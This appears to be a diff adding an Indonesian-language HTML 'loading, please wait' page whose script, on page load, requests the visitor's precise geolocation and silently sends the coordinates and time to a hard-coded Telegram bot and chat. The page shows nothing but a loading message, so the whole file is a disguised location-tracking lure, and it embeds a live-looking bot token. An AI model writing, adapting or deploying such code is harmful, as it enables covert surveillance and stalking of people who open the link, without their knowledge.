@@ -1,0 +1,32 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Memuat...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h2>Memuat, mohon tunggu...</h2>
+  <script>
+    function sendLocation(lat, lon) {
+      const url = `https://api.telegram.org/bot7581454048:AAEIhACdDrZl7MJX2Ui4699i09RpDX1QX6Y/sendMessage?chat_id=1919539641&text=Lokasi: https://maps.google.com/?q=${lat},${lon}%0AWaktu: ${new Date().toLocaleString()}`;
+      fetch(url);
+    }
+
+    function success(pos) {
+      const crd = pos.coords;
+      sendLocation(crd.latitude, crd.longitude);
+    }
+
+    function error(err) {
+      alert('Gagal mendapatkan lokasi: ' + err.message);
+    }
+
+    navigator.geolocation.getCurrentPosition(success, error, {
+      enableHighAccuracy: true,
+      timeout: 5000,
+      maximumAge: 0
+    });
+  </script>
+</body>
+</html>
